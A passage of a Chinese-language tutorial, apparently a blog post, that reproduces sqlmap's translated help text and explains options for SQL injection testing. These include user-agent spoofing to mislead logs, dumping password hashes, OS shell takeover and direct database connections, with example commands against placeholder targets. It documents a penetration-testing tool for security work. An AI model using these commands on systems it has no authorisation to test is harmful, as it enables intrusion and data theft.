class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line">用法：python sqlmap.py [选项]</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -h, --help            显示基本帮助信息并退出</span><br><span class="line">  -hh                   显示高级帮助信息并退出</span><br><span class="line">  --version             显示程序版本信息并退出</span><br><span class="line">  -v VERBOSE            输出信息详细程度级别：0-6（默认为 1）</span><br><span class="line"></span><br><span class="line">  目标：</span><br><span class="line">      至少提供一个以下选项以指定目标</span><br><span class="line"></span><br><span class="line">    -d DIRECT           直接连接数据库</span><br><span class="line">    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）</span><br><span class="line">    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">    -x SITEMAPURL       从远程网站地图（.xml）文件中解析目标</span><br><span class="line">    -m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">    -r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">    -g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">    -c CONFIGFILE       从 INI 配置文件中加载选项</span><br><span class="line"></span><br><span class="line">  请求：</span><br><span class="line">      以下选项可以指定连接目标地址的方式</span><br><span class="line"></span><br><span class="line">    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">    --data=DATA         使用 POST 发送数据串</span><br><span class="line">    --param-del=PARA..  设置参数值分隔符</span><br><span class="line">    --cookie=COOKIE     指定 HTTP Cookie</span><br><span class="line">    --cookie-del=COO..  设置 cookie 分隔符</span><br><span class="line">    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">    --user-agent=AGENT  指定 HTTP User-Agent</span><br><span class="line">    --random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">    --host=HOST         指定 HTTP Host</span><br><span class="line">    --referer=REFERER   指定 HTTP Referer</span><br><span class="line">    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）</span><br><span class="line">    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）</span><br><span class="line">    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">    --auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">    --ignore-code=IG..  忽略 HTTP 错误码（例如：401）</span><br><span class="line">    --ignore-proxy      忽略系统默认代理设置</span><br><span class="line">    --ignore-redirects  忽略重定向尝试</span><br><span class="line">    --ignore-timeouts   忽略连接超时</span><br><span class="line">    --proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">    --proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">    --proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">    --tor               使用 Tor 匿名网络</span><br><span class="line">    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">    --check-tor         检查是否正确使用了 Tor</span><br><span class="line">    --delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">    --retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">    --randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                        有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                        后面的“请求”小节有详细说明）</span><br><span class="line">    --safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">    --safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">    --skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">    --csrf-url=CSRFURL  指定可提取反 CSRF 攻击 token 的 URL</span><br><span class="line">    --force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">    --hpp               使用 HTTP 参数污染攻击</span><br><span class="line">    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）</span><br><span class="line"></span><br><span class="line">  优化：</span><br><span class="line">    以下选项用于优化 sqlmap 性能</span><br><span class="line"></span><br><span class="line">    -o                  开启所有优化开关</span><br><span class="line">    --predict-output    预测常用请求的输出</span><br><span class="line">    --keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">    --null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br><span class="line"></span><br><span class="line">  注入：</span><br><span class="line">    以下选项用于指定要测试的参数，</span><br><span class="line">    提供自定义注入 payloads 和篡改参数的脚本</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">    --skip=SKIP         指定要跳过的参数</span><br><span class="line">    --skip-static       指定跳过非动态参数</span><br><span class="line">    --param-exclude=..  用正则表达式排除参数（例如："ses"）</span><br><span class="line">    --dbms=DBMS         指定 DBMS 类型（例如：MySQL）</span><br><span class="line">    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">    --os=OS             指定 DBMS 服务器的操作系统类型</span><br><span class="line">    --invalid-bignum    将无效值设置为大数</span><br><span class="line">    --invalid-logical   对无效值使用逻辑运算</span><br><span class="line">    --invalid-string    对无效值使用随机字符串</span><br><span class="line">    --no-cast           关闭 payload 构造机制</span><br><span class="line">    --no-escape         关闭字符串转义机制</span><br><span class="line">    --prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">    --suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">    --tamper=TAMPER     用给定脚本修改注入数据</span><br><span class="line"></span><br><span class="line">  检测：</span><br><span class="line">    以下选项用于自定义检测方式</span><br><span class="line"></span><br><span class="line">    --level=LEVEL       设置测试等级（1-5，默认为 1）</span><br><span class="line">    --risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br><span class="line">    --string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line">    --not-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line">    --regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line">    --code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line">    --text-only         只根据页面文本内容对比页面</span><br><span class="line">    --titles            只根据页面标题对比页面</span><br><span class="line"></span><br><span class="line">  技术：</span><br><span class="line">    以下选项用于调整特定 SQL 注入技术的测试方法</span><br><span class="line"></span><br><span class="line">    --technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                        B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                        E: Error-based SQL injection（报错型注入）</span><br><span class="line">                        U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                        S: Stacked queries SQL injection（堆查询注入）</span><br><span class="line">                        T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                        Q: inline Query injection（内联查询注入）</span><br><span class="line">    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">    --union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line">    --union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line">    --union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line">    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                        推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                        http://cb.drops.wiki/drops/tips-5283.html，</span><br><span class="line">                        在后面的“技术”小节中也有相应解释）</span><br><span class="line">    --second-order=S..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                        该选项用于二阶 SQL 注入）</span><br><span class="line"></span><br><span class="line">  指纹识别：</span><br><span class="line">    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br><span class="line"></span><br><span class="line">  枚举：</span><br><span class="line">      以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。</span><br><span class="line">      此外，还���以运行你输入的 SQL 语句</span><br><span class="line"></span><br><span class="line">    -a, --all           获取所有信息、数据</span><br><span class="line">    -b, --banner        获取 DBMS banner</span><br><span class="line">    --current-user      获取 DBMS 当前用户</span><br><span class="line">    --current-db        获取 DBMS 当前数据库</span><br><span class="line">    --hostname          获取 DBMS 服务器的主机名</span><br><span class="line">    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">    --users             枚举出 DBMS 所有用户</span><br><span class="line">    --passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">    --privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">    --roles             枚举出 DBMS 所有用户角色</span><br><span class="line">    --dbs               枚举出 DBMS 所有数据库</span><br><span class="line">    --tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">    --columns           枚举出 DBMS 表中的所有列</span><br><span class="line">    --schema            枚举出 DBMS 所有模式</span><br><span class="line">    --count             获取数据表数目</span><br><span class="line">    --dump              导出 DBMS 数据库表项</span><br><span class="line">    --dump-all          导出所有 DBMS 数据库表项</span><br><span class="line">    --search            搜索列，表和/或数据库名</span><br><span class="line">    --comments          获取 DBMS 注释</span><br><span class="line">    -D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">    -T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">    -C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">    -X EXCLUDECOL       指定要排除的 DBMS 数据列</span><br><span class="line">    -U USER             指定枚举的 DBMS 用户</span><br><span class="line">    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">    --pivot-column=P..  指定主列</span><br><span class="line">    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">    --start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">    --stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br><span class="line">    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">    --last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">    --sql-query=QUERY   指定要执行的 SQL 语句</span><br><span class="line">    --sql-shell         调出交互式 SQL shell</span><br><span class="line">    --sql-file=SQLFILE  执行文件中的 SQL 语句</span><br><span class="line"></span><br><span class="line">  暴��破解：</span><br><span class="line">    以下选项用于暴力破解测试</span><br><span class="line"></span><br><span class="line">    --common-tables     检测常见的表名是否存在</span><br><span class="line">    --common-columns    检测常用的列名是否存在</span><br><span class="line"></span><br><span class="line">  用户自定义函数注入：</span><br><span class="line">    以下选项用于创建用户自定义函数</span><br><span class="line"></span><br><span class="line">    --udf-inject        注入用户自定义函数</span><br><span class="line">    --shared-lib=SHLIB  共享库的本地路径</span><br><span class="line"></span><br><span class="line">  访问文件系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层文件系统</span><br><span class="line"></span><br><span class="line">    --file-read=RFILE   读取后端 DBMS 文件系统中的文件</span><br><span class="line">    --file-write=WFILE  写入后端 DBMS 文件系统中的文件</span><br><span class="line">    --file-dest=DFILE   使用文件绝对路径写入到后端 DBMS</span><br><span class="line"></span><br><span class="line">  访问操作系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层操作系统</span><br><span class="line"></span><br><span class="line">    --os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">    --os-shell          调出交互式操作系统 shell</span><br><span class="line">    --os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">    --os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">    --priv-esc          数据库进程用户提权</span><br><span class="line">    --msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">    --tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br><span class="line"></span><br><span class="line">  访问 Windows 注册表：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的 Windows 注册表</span><br><span class="line"></span><br><span class="line">    --reg-read          读取一个 Windows 注册表键值</span><br><span class="line">    --reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">    --reg-del           删除一个 Windows 注册表键值</span><br><span class="line">    --reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">    --reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">    --reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">    --reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br><span class="line"></span><br><span class="line">  通用选项：</span><br><span class="line">    以下选项用于设置通用的参数</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">    --batch             从不询问用户输入，使用默认配置</span><br><span class="line">    --binary-fields=..  具有二进制值的结果字段（例如："digest"）</span><br><span class="line">    --check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）</span><br><span class="line">    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）</span><br><span class="line">    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">    --eta               显示每个结果输出的预计到达时间</span><br><span class="line">    --flush-session     清空当前目标的会话文件</span><br><span class="line">    --forms             解析并测试目标 URL 的表单</span><br><span class="line">    --fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">    --hex               获取数据时调用 DBMS 的 hex 函数</span><br><span class="line">    --output-dir=OUT..  自定义输出目录路径</span><br><span class="line">    --parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">    --scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">    --update            更新 sqlmap</span><br><span class="line"></span><br><span class="line">  其他选项：</span><br><span class="line">    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">    --alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">    --answers=ANSWERS   设置问题答案（例如：“quit=N,follow=N”）</span><br><span class="line">    --beep              出现问题提醒或在发现 SQL 注入时发出提示音</span><br><span class="line">    --cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span><br><span class="line">    --dependencies      检查 sqlmap 缺少什么（非核心）依赖</span><br><span class="line">    --disable-coloring  关闭彩色控制台输出</span><br><span class="line">    --gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span><br><span class="line">    --identify-waf      针对 WAF/IPS/IDS 保护进行彻底的测试</span><br><span class="line">    --mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">    --offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">    --purge-output      安全地删除输出目录的所有内容</span><br><span class="line">    --skip-waf          跳过启发式检测 WAF/IPS/IDS 保护</span><br><span class="line">    --smart             只有在使用启发式检测时才进行彻底的测试</span><br><span class="line">    --sqlmap-shell      调出交互式 sqlmap shell</span><br><span class="line">    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）</span><br><span class="line">    --wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>--random-agent</code>      使用随机的 HTTP User-Agent 可以欺骗网站日志记录<br><code>--dbms =MySQL</code>       指定数据库 节省时间<br><code>--technique=</code>       指定报错注入 节省时间</p>
</blockquote>
<h1 id="SQLMap中级"><a href="#SQLMap中级" class="headerlink" title="SQLMap中级"></a>SQLMap中级</h1><h2 id="输出详细等级"><a href="#输出详细等级" class="headerlink" title="输出详细等级"></a>输出详细等级</h2><p>选项：<code>-v</code></p>
<p>该选项用于设置输出信息的详细等级，共有<strong>七个</strong>级别。默认级别为 <strong>1</strong>，输出包括普通信息，警告，错误，关键信息和 Python 出错回遡信息（如果有的话）。</p>
<ul>
<li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息。</li>
<li><strong>1</strong>：增加输出普通信息和警告信息。</li>
<li><strong>2</strong>：增加输出调试信息。</li>
<li><strong>3</strong>：增加输出已注入的 payloads。</li>
<li><strong>4</strong>：增加输出 HTTP 请求。</li>
<li><strong>5</strong>：增加输出 HTTP 响应头</li>
<li><strong>6</strong>：增加输出 HTTP 响应内容。</li>
</ul>
<p>使用等级 <strong>2</strong> 能更好地了解 sqlmap 内部实现了什么，特别是在检测阶段和使用接管功能时。如果你想知道 sqlmap 发送了什么 SQL payloads，等级 <strong>3</strong> 是最佳选择。需要更深入地检测潜在 Bugs 或应对未知情况时，推荐使用 <strong>4</strong> 或以上等级。</p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="从给定的文本文件读取多个目标进行扫描"><a href="#从给定的文本文件读取多个目标进行扫描" class="headerlink" title="从给定的文本文件读取多个目标进行扫描"></a>从给定的文本文件读取多个目标进行扫描</h3><p>选项：<code>-m</code></p>
<p>通过文本文件提供一个目标 URLs 列表，sqlmap 会逐个进行扫描检测。</p>
<p>样本文件所提供的 URLs 列表示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>
<h3 id="从文件中载入-HTTP-请求"><a href="#从文件中载入-HTTP-请求" class="headerlink" title="从文件中载入 HTTP 请求"></a>从文件中载入 HTTP 请求</h3><p>选项：<code>-r</code></p>
<p>sqlmap 可以从一个文本中读取原始的 HTTP 请求。通过这种方式，你能够免于设置部分选项（例如：设置 cookies，POST 数据等参数）。</p>
<p>HTTP 请求文件数据样本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.target.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
<p>如果相关的请求是 HTTPS，你可以结合 <code>--force-ssl</code> 开关强制使用 SSL 进行 443/tcp 连接。或者，你可以在 <code>Host</code> 头部信息后面直接加上 <code>:443</code>。</p>
<h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h3 id="HTTP-User-Agent-请求头"><a href="#HTTP-User-Agent-请求头" class="headerlink" title="HTTP User-Agent 请求头"></a>HTTP <code>User-Agent</code> 请求头</h3><p>选项和开关：<code>--user-agent</code> 和 <code>--random-agent</code></p>
<p>默认情况下，sqlmap 使用以下 <code>User-Agent</code> 请求头值执行 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure>
<p>可以通过提供自定义 User-Agent 作为选项的参数，即选项 <code>--user-agent</code> 来伪造它。</p>
<p>此外，如果通过提供开关 <code>--random-agent</code>，sqlmap 将从 <code>./txt/user-agents.txt</code> 文本文件中随机选择一个 <code>User-Agent</code>，并将其用于该会话中的所有 HTTP 请求。</p>
<p>一些站点会对 HTTP <code>User-Agent</code> 请求头值进行服务端检查，如果没有提供有效的 <code>User-Agent</code>，它的值不是常规值或被 Web 应用程序防火墙或类似防御系统列入黑名单，则服务端会拒绝 HTTP 响应。在这种情况下，sqlmap 将显示如下信息：</p>
<p>注意，如果 <code>--level</code> 设置为 <strong>3</strong> 或以上，sqlmap 会对 HTTP <code>User-Agent</code> 请求头进行 SQL 注入测试。详情请看下文。</p>
<p>开启<code>apache</code>的日志记录功能</p>
<p>注意，如果 <code>--level</code> 设置为 <strong>3</strong> 或以上，sqlmap 会对 HTTP <code>User-Agent</code> 请求头进行 SQL 注入测试。详情请看下文。</p>
<p>打开配置文件-httpd-conf”，打开httpd.conf配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##CustomLog &quot;logs/access.log&quot; common</span><br></pre></td></tr></table></figure>
<p>去掉前边的 # ，并<strong>重启apache</strong>。</p>
<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>下面的相关选项可用于自定义检测环节。</p>
<h3 id="级别"><a href="#级别" class="headerlink" title="级别"></a>级别</h3><p>选项：<code>--level</code></p>
<p>使用这个选项需要给出一个参数用于指定即将进行检测的级别。总共有5个级别。</p>
<p>默认的级别是 <strong>1</strong>，该级别只会进行简单的检测（请求）。</p>
<p>与之不同的是，级别 <strong>5</strong> 会更详细地对更大范围 payloads 和 boundaries（作为 SQL payload 的前缀和后缀）进行检测。</p>
<p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p>
<p>根据该文件顶部的相关指导说明进行设置，该文件支持用户自定义编辑添加。</p>
<p>这个选项设置不止会影响 sqlmap 使用的 payload，还会影响到相关的测试注入点：<strong>总是</strong>测试 GET 和 POST 的相关参数，级别大于等于 <strong>2</strong> 则会测试 HTTP Cookie 头部，级别大于等于 <strong>3</strong> 则会测试 HTTP UserAgent/Referer 头部值。</p>
<p>总而言之， 如果 SQL 注入检测的难度越高，则需要设定越高的 <code>--level</code> 值。</p>
<h3 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h3><p>选项：<code>--risk</code></p>
<p>这个选项需要给出一个参数用于指定即将进行检测的风险程度。总共有3个风险级别。</p>
<p>默认的级别是 <strong>1</strong>，对大多数 SQL 注入点而言是没有任何风险的。风险级别 <strong>2</strong> 则会在默认的检测上添加大量时间型盲注语句测试，级别 <strong>3</strong> 则会在原基础上添加<code>OR</code>类型的布尔型盲注测试。</p>
<p>在某些场景下，例如对 <code>UPDATE</code> 语句进行 SQL 注入，注入一个 <code>OR</code> 类型的 payload 会导致目标数据表的所有记录进行更新，显然这个不是攻击者想要的结果。针</p>
<p>对这个场景及其他相关场景，sqlmap 引入了 <code>--risk</code> 这个选项。通过这个选项：用户可以指定检测特定的 payload，同时用户可任意选择使用可能比较危险的操作。正如上面的选项提及到的，sqlmap 使用的 payloads 是直接在文本文件 <code>xml/payloads.xml</code> 载入的，该文件支持用户自定义编辑添加。</p>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="URI-注入点"><a href="#URI-注入点" class="headerlink" title="URI 注入点"></a>URI 注入点</h3><p>有一些特殊情况是注入点处于 URI 本身内。除非手动指定，sqlmap 不会对 URI 路径执行任何自动测试。你需要在命令行中标明这些注入点，通过在每个需要 sqlmap 测试和利用 SQL 注入的 URI 点后面附加一个星号（<code>*</code>）（注意：也支持 Havij 风格 <code>%INJECT HERE%</code>）。</p>
<p>例如，当使用了 Apache Web 服务器的 <a href="http://httpd.apache.org/docs/current/mod/mod_rewrite.html" target="_blank" rel="noopener">mod_rewrite</a> 模块或其他类似的技术时，这特别有用。</p>
<p>一个合法命令行例子如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;</span><br></pre></td></tr></table></figure>
<h3 id="指定-DBMS-类型"><a href="#指定-DBMS-类型" class="headerlink" title="指定 DBMS 类型"></a>指定 DBMS 类型</h3><p>选项：<code>--dbms</code></p>
<p>默认情况下 sqlmap 会自动检测 Web 应用程序的后端 DBMS。sqlmap 完全支持以下数据库管理系统：</p>
<ul>
<li>MySQL</li>
<li>Oracle</li>
<li>PostgreSQL</li>
<li>Microsoft SQL Server</li>
<li>Microsoft Access</li>
<li>IBM DB2</li>
<li>SQLite</li>
<li>Firebird</li>
<li>Sybase</li>
<li>SAP MaxDB</li>
<li>HSQLDB</li>
<li>Informix</li>
</ul>
<p>注意，此选项<strong>不</strong>是强制性的，强烈建议<strong>仅当你绝对确定</strong>后端 DBMS 时使用它。如果你不知道，就让 sqlmap 自动为你识别指纹信息。</p>
<h2 id="接管操作系统"><a href="#接管操作系统" class="headerlink" title="接管操作系统"></a>接管操作系统</h2><h3 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h3><p>选项和开关：<code>--os-cmd</code> 和 <code>--os-shell</code></p>
<p>当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时，sqlmap 能够在<strong>数据库所在服务器的操作系统上运行任意的命令</strong>。</p>
<h1 id="SQLMap高级"><a href="#SQLMap高级" class="headerlink" title="SQLMap高级"></a>SQLMap高级</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><h3 id="直连数据库"><a href="#直连数据库" class="headerlink" title="直连数据库"></a>直连数据库</h3><p>选项：<code>-d</code></p>
<p>针对单一数据库实例运行 sqlmap 工具。这个选项可设置为下面格式的连接字符串：</p>
<ul>
<li><code>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</code>（MySQL，Oracle，Microsoft SQL Server，PostgreSQL 等。)</li>
<li><code>DBMS://DATABASE_FILEPATH</code>（SQLite，Microsoft Access，Firebird 等。）</li>
</ul>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -d <span class="string">"mysql://admin:admin@192.168.21.17:3306/testdb"</span> --dbs --users</span><br></pre></td></tr></table></figure>
<p>需要 Python 安装对应的依赖：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install SQLAlchemy</span><br><span class="line">pip3 install mysqlclient</span><br></pre></td></tr></table></figure>
<h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>以下选项可用于调整对特定 SQL 注入技术的测试。</p>
<h3 id="测试会用到的-SQL-注入技术"><a href="#测试会用到的-SQL-注入技术" class="headerlink" title="测试会用到的 SQL 注入技术"></a>测试会用到的 SQL 注入技术</h3><p>选项：<code>--technique</code></p>
<p>此选项用于指定需要测试的 SQL 注入类型。默认情况下 sqlmap 会测试它支持的<strong>所有</strong>类型/技术。</p>
<p>在某些情况下，你可能只想测试一种或几种特定类型的 SQL 注入，这便是该选项存在的作用。</p>
<p>此选项要一个参数值。该参数是由 <code>B</code>，<code>E</code>，<code>U</code>，<code>S</code>，<code>T</code> 和 <code>Q</code> 这样的字符任意组合成的字符串，每个字母代表不同的技术：</p>
<ul>
<li><code>B</code>：布尔型盲注</li>
<li><code>E</code>：报错型注入</li>
<li><code>U</code>：联合查询注入</li>
<li><code>S</code>：堆查询注入</li>
<li><code>T</code>：时间型盲注</li>
<li><code>Q</code>：内联查询注入</li>
</ul>
<p>例如，如果仅测试利用报错型注入和堆查询注入，你可以提供 <code>ES</code>。默认值为 <code>BEUSTQ</code>。</p>
<p>注意，当你需要访问文件系统，接管操作系统或访问 Windows 注册表配置单元时，提供的字符串必须包含代表堆查询技术的字母 <code>S</code>。</p>
<h3 id="设置时间型盲注中-DBMS-延迟响应秒数"><a href="#设置时间型盲注中-DBMS-延迟响应秒数" class="headerlink" title="设置时间型盲注中 DBMS 延迟响应秒数"></a>设置时间型盲注中 DBMS 延迟响应秒数</h3><p>选项：<code>--time-sec</code></p>
<p>为 <code>--time-sec</code> 提供一个整数，可以设置时间型盲注响应的延迟时间。默认情况下，它的值为 <strong>5 秒</strong>。</p>
